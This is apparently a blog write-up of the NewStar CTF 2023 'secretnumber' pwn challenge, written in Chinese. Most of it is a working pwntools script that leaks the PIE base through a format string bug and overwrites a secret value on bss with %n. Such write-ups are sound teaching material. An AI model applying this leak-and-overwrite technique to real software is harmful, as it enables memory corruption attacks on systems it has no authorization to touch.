---
title: newstar2023 week2 - secretnumber
date: 2023/10/3 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 通过格式化字符串漏洞，利用bss上的secret数字地址进行覆盖，成功解题。
---

## 文件分析

下载`secretnumber`, 保护全开  
ghidra分析为64位程序

## 解题思路

输入1后可以触发格式化字符串漏洞，由于secret数字放在bss上，所以可以先获得地址，
在写入小数字覆盖，然后输入非1数字进入猜数字环节，输入覆盖的数字即可

## EXPLOIT

```python
from pwn import *
sh = remote('node4.buuoj.cn', 29392)

# payload 1
sh.sendline(b'1')
sh.sendlineafter(b'it', b'%17$p') # locate main to get pieBase

sh.recvuntil(b'gift:\n')
pieBase = int(sh.recvline()[:14], 16) - 0x12f5
secretAddr = pieBase + 0x404c

sh.sendline(b'1')
sh.sendlineafter(b'it', b'pad_%9$n' + p64(secretAddr)) # arg8: pad_%9$n, arg9: secretAddr

sh.sendlineafter(b'/1)', b'0')
sh.sendlineafter(b'number', b'4')
sh.interactive()
```

Done.
